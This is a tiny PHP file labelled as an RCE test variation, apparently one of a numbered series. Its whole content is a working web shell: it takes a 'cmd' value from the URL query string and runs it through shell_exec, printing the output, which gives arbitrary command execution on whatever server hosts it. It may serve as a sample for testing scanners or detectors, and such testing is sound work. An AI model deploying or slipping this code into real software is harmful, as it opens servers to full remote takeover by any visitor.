<?php
// RCE test variation #105
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>